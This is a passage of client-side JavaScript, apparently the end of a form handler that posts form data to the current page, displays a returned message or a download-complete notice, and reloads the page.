    
    fetch(window.location.href, {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(html => {
        var temp = document.createElement('div');
        temp.innerHTML = html;
        var msg = temp.querySelector('.message');
        if (msg) {
            resultDiv.innerHTML = msg.innerText;
        } else {
            resultDiv.innerHTML = '✅ Download completed!';
        }
        location.reload();
    })
    .catch(error => {
        resultDiv.innerHTML = '❌ Error: ' + error;
    });
    
    return false;
}
